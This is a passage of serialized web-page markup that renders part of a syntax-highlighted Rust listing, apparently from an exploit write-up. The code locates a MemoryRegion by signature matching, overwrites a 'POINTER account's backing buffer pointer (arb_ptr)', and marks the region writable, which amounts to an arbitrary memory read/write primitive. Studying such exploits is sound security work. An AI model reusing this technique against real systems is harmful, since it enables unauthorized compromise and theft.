token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n10b4:[\"$\",\"span\",\"code-segment-564\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n10b5:[\"$\",\"span\",\"line-number--61\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[61]}]\n10b6:[\"$\",\"span\",\"line-number--62\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[62]}]\n10b7:[\"$\",\"span\",\"code-segment-568\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n10b8:[\"$\",\"span\",\"code-segment-569\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"loop\"]}]\n10b9:[\"$\",\"span\",\"code-segment-570\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10ba:[\"$\",\"span\",\"code-segment-571\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n10bb:[\"$\",\"span\",\"code-segment-572\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n10bc:[\"$\",\"span\",\"line-number--63\",{\"className\":\"linenumber react-sy"])</script><script>self.__next_f.push([1,"ntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[63]}]\n10bd:[\"$\",\"span\",\"code-segment-574\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n10be:[\"$\",\"span\",\"code-segment-575\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Signature matching to reliably identify MemoryRegion\"]}]\n10bf:[\"$\",\"span\",\"code-segment-576\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n10c0:[\"$\",\"span\",\"line-number--64\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[64]}]\n10c1:[\"$\",\"span\",\"code-segment-578\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n10c2:[\"$\",\"span\",\"code-segment-579\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\n10c3:[\"$\",\"span\",\"code-segment-580\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10c4:[\"$\",\"span\",\"code-segment-581\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n10c5:[\"$\",\"span\",\"code-segment-582\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n10c6:[\"$\",\"span\",\"code-segment-583\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n10c7:[\"$\",\"span\",\"code-segment-584\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}]\n10c8:[\"$\",\"span\",\"code-segment-585\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\n10c9:[\"$\",\"span\",\"code-segment-586\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10ca:[\"$\",\"span\",\"code-segment-587\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x18\"]}]\n10cb:[\"$\",\"span\",\"code-segment-588\",{\"className\":\"token token\",\"style\":{\"col"])</script><script>self.__next_f.push([1,"or\":\"#ccc\"},\"children\":[\")\"]}]\n10cc:[\"$\",\"span\",\"code-segment-589\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10cd:[\"$\",\"span\",\"code-segment-590\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n10ce:[\"$\",\"span\",\"code-segment-591\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10cf:[\"$\",\"span\",\"code-segment-592\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n10d0:[\"$\",\"span\",\"code-segment-593\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\n10d1:[\"$\",\"span\",\"code-segment-594\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10d2:[\"$\",\"span\",\"code-segment-595\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n10d3:[\"$\",\"span\",\"code-segment-596\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n10d4:[\"$\",\"span\",\"code-segment-597\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10d5:[\"$\",\"span\",\"code-segment-598\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}]\n10d6:[\"$\",\"span\",\"code-segment-599\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10d7:[\"$\",\"span\",\"code-segment-600\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x000000040020a238\"]}]\n10d8:[\"$\",\"span\",\"code-segment-601\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10d9:[\"$\",\"span\",\"code-segment-602\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}]\n10da:[\"$\",\"span\",\"code-segment-603\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n10db:[\"$\",\"span\",\"line-number--65\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[65]}]\n10dc:[\"$\",\"span\",\"code-segment-605\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                   \"]}]\n10dd:[\"$\",\"span\",\"code-segment-606\",{\"classN"])</script><script>self.__next_f.push([1,"ame\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n10de:[\"$\",\"span\",\"code-segment-607\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n10df:[\"$\",\"span\",\"code-segment-608\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n10e0:[\"$\",\"span\",\"code-segment-609\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}]\n10e1:[\"$\",\"span\",\"code-segment-610\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\n10e2:[\"$\",\"span\",\"code-segment-611\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10e3:[\"$\",\"span\",\"code-segment-612\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x58\"]}]\n10e4:[\"$\",\"span\",\"code-segment-613\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n10e5:[\"$\",\"span\",\"code-segment-614\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10e6:[\"$\",\"span\",\"code-segment-615\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n10e7:[\"$\",\"span\",\"code-segment-616\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10e8:[\"$\",\"span\",\"code-segment-617\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n10e9:[\"$\",\"span\",\"code-segment-618\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\n10ea:[\"$\",\"span\",\"code-segment-619\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10eb:[\"$\",\"span\",\"code-segment-620\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n10ec:[\"$\",\"span\",\"code-segment-621\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n10ed:[\"$\",\"span\",\"code-segment-622\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10ee:[\"$\",\"span\",\"code-segment-623\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}]\n10ef:[\"$\",\"span\",\"code-segment-624\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10f0:[\"$\",\"span\",\"code-segment-625\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x000000040020290"])</script><script>self.__next_f.push([1,"8\"]}]\n10f1:[\"$\",\"span\",\"code-segment-626\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10f2:[\"$\",\"span\",\"code-segment-627\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}]\n10f3:[\"$\",\"span\",\"code-segment-628\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n10f4:[\"$\",\"span\",\"line-number--66\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[66]}]\n10f5:[\"$\",\"span\",\"code-segment-630\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                   \"]}]\n10f6:[\"$\",\"span\",\"code-segment-631\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n10f7:[\"$\",\"span\",\"code-segment-632\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n10f8:[\"$\",\"span\",\"code-segment-633\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n10f9:[\"$\",\"span\",\"code-segment-634\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}]\n10fa:[\"$\",\"span\",\"code-segment-635\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\n10fb:[\"$\",\"span\",\"code-segment-636\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10fc:[\"$\",\"span\",\"code-segment-637\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x98\"]}]\n10fd:[\"$\",\"span\",\"code-segment-638\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n10fe:[\"$\",\"span\",\"code-segment-639\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10ff:[\"$\",\"span\",\"code-segment-640\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n1100:[\"$\",\"span\",\"code-segment-641\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1101:[\"$\",\"span\",\"code-segment-642\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n1102:[\"$\",\"span\",\"code-segment-643\",{\"className\":\"token token\",\"style\""])</script><script>self.__next_f.push([1,":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\n1103:[\"$\",\"span\",\"code-segment-644\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1104:[\"$\",\"span\",\"code-segment-645\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n1105:[\"$\",\"span\",\"code-segment-646\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1106:[\"$\",\"span\",\"code-segment-647\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1107:[\"$\",\"span\",\"code-segment-648\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}]\n1108:[\"$\",\"span\",\"code-segment-649\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1109:[\"$\",\"span\",\"code-segment-650\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x000000040020f308\"]}]\n110a:[\"$\",\"span\",\"code-segment-651\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n110b:[\"$\",\"span\",\"code-segment-652\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}]\n110c:[\"$\",\"span\",\"code-segment-653\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n110d:[\"$\",\"span\",\"line-number--67\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[67]}]\n110e:[\"$\",\"span\",\"code-segment-655\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                   \"]}]\n110f:[\"$\",\"span\",\"code-segment-656\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n1110:[\"$\",\"span\",\"code-segment-657\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1111:[\"$\",\"span\",\"code-segment-658\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1112:[\"$\",\"span\",\"code-segment-659\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}]\n1113:[\"$\",\"span\",\"code-segment-660\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\n1114:[\"$\",\"span\""])</script><script>self.__next_f.push([1,",\"code-segment-661\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1115:[\"$\",\"span\",\"code-segment-662\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0xd8\"]}]\n1116:[\"$\",\"span\",\"code-segment-663\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1117:[\"$\",\"span\",\"code-segment-664\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1118:[\"$\",\"span\",\"code-segment-665\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n1119:[\"$\",\"span\",\"code-segment-666\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n111a:[\"$\",\"span\",\"code-segment-667\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n111b:[\"$\",\"span\",\"code-segment-668\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\n111c:[\"$\",\"span\",\"code-segment-669\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n111d:[\"$\",\"span\",\"code-segment-670\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n111e:[\"$\",\"span\",\"code-segment-671\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n111f:[\"$\",\"span\",\"code-segment-672\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1120:[\"$\",\"span\",\"code-segment-673\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}]\n1121:[\"$\",\"span\",\"code-segment-674\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1122:[\"$\",\"span\",\"code-segment-675\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x0000000400000000\"]}]\n1123:[\"$\",\"span\",\"code-segment-676\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1124:[\"$\",\"span\",\"code-segment-677\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n1125:[\"$\",\"span\",\"code-segment-678\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1126:[\"$\",\"span\",\"line-number--68\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"n"])</script><script>self.__next_f.push([1,"one\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[68]}]\n1127:[\"$\",\"span\",\"line-number--69\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[69]}]\n1128:[\"$\",\"span\",\"code-segment-682\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n1129:[\"$\",\"span\",\"code-segment-683\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n112a:[\"$\",\"span\",\"code-segment-684\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" thread_mem \"]}]\n112b:[\"$\",\"span\",\"code-segment-685\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n112c:[\"$\",\"span\",\"code-segment-686\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n112d:[\"$\",\"span\",\"code-segment-687\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n112e:[\"$\",\"span\",\"code-segment-688\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n112f:[\"$\",\"span\",\"code-segment-689\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1130:[\"$\",\"span\",\"code-segment-690\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1131:[\"$\",\"span\",\"code-segment-691\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}]\n1132:[\"$\",\"span\",\"code-segment-692\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\n1133:[\"$\",\"span\",\"code-segment-693\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1134:[\"$\",\"span\",\"code-segment-694\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x48\"]}]\n1135:[\"$\",\"span\",\"code-segment-695\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1136:[\"$\",\"span\",\"code-segment-696\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1137:[\"$\",\"span\",\"code-segment-697\",{\"className\":\"tok"])</script><script>self.__next_f.push([1,"en token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n1138:[\"$\",\"span\",\"code-segment-698\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1139:[\"$\",\"span\",\"code-segment-699\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n113a:[\"$\",\"span\",\"code-segment-700\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\n113b:[\"$\",\"span\",\"code-segment-701\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n113c:[\"$\",\"span\",\"code-segment-702\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n113d:[\"$\",\"span\",\"code-segment-703\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n113e:[\"$\",\"span\",\"code-segment-704\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n113f:[\"$\",\"span\",\"code-segment-705\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\n1140:[\"$\",\"span\",\"code-segment-706\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1141:[\"$\",\"span\",\"code-segment-707\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"21\"]}]\n1142:[\"$\",\"span\",\"code-segment-708\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1143:[\"$\",\"span\",\"code-segment-709\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1144:[\"$\",\"span\",\"code-segment-710\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\u003c\"]}]\n1145:[\"$\",\"span\",\"code-segment-711\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1146:[\"$\",\"span\",\"code-segment-712\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"21\"]}]\n1147:[\"$\",\"span\",\"code-segment-713\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n1148:[\"$\",\"span\",\"code-segment-714\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1149:[\"$\",\"span\",\"line-number--70\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1"])</script><script>self.__next_f.push([1,"px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[70]}]\n114a:[\"$\",\"span\",\"line-number--71\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[71]}]\n114b:[\"$\",\"span\",\"code-segment-718\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n114c:[\"$\",\"span\",\"code-segment-719\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Overwrite POINTER account's backing buffer pointer (arb_ptr)\"]}]\n114d:[\"$\",\"span\",\"code-segment-720\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n114e:[\"$\",\"span\",\"line-number--72\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[72]}]\n114f:[\"$\",\"span\",\"code-segment-722\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n1150:[\"$\",\"span\",\"code-segment-723\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n1151:[\"$\",\"span\",\"code-segment-724\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1152:[\"$\",\"span\",\"code-segment-725\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1153:[\"$\",\"span\",\"code-segment-726\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}]\n1154:[\"$\",\"span\",\"code-segment-727\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\n1155:[\"$\",\"span\",\"code-segment-728\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1156:[\"$\",\"span\",\"code-segment-729\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x490\"]}]\n1157:[\"$\",\"span\",\"code-segment-730\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1158:[\"$\",\"span\""])</script><script>self.__next_f.push([1,",\"code-segment-731\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1159:[\"$\",\"span\",\"code-segment-732\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n115a:[\"$\",\"span\",\"code-segment-733\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n115b:[\"$\",\"span\",\"code-segment-734\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n115c:[\"$\",\"span\",\"code-segment-735\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n115d:[\"$\",\"span\",\"code-segment-736\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n115e:[\"$\",\"span\",\"code-segment-737\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n115f:[\"$\",\"span\",\"code-segment-738\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1160:[\"$\",\"span\",\"code-segment-739\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1161:[\"$\",\"span\",\"code-segment-740\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n1162:[\"$\",\"span\",\"code-segment-741\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" thread_mem\"]}]\n1163:[\"$\",\"span\",\"code-segment-742\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n1164:[\"$\",\"span\",\"code-segment-743\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1165:[\"$\",\"span\",\"line-number--73\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[73]}]\n1166:[\"$\",\"span\",\"code-segment-745\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n1167:[\"$\",\"span\",\"code-segment-746\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Set memory region state to writable\"]}]\n1168:[\"$\",\"span\",\"code-segment-747\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1169:[\"$\",\"span\",\"line-number--74\",{\"className\":\"linenumber react-syn"])</script><script>self.__next_f.push([1,"tax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[74]}]\n116a:[\"$\",\"span\",\"code-segment-749\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n116b:[\"$\",\"span\",\"code-segment-750\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n116c:[\"$\",\"span\",\"code-segment-751\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n116d:[\"$\",\"span\",\"code-segment-752\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n116e:[\"$\",\"span\",\"code-segment-753\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}]\n116f:[\"$\",\"span\",\"code-segment-754\",{\"className\":\"token 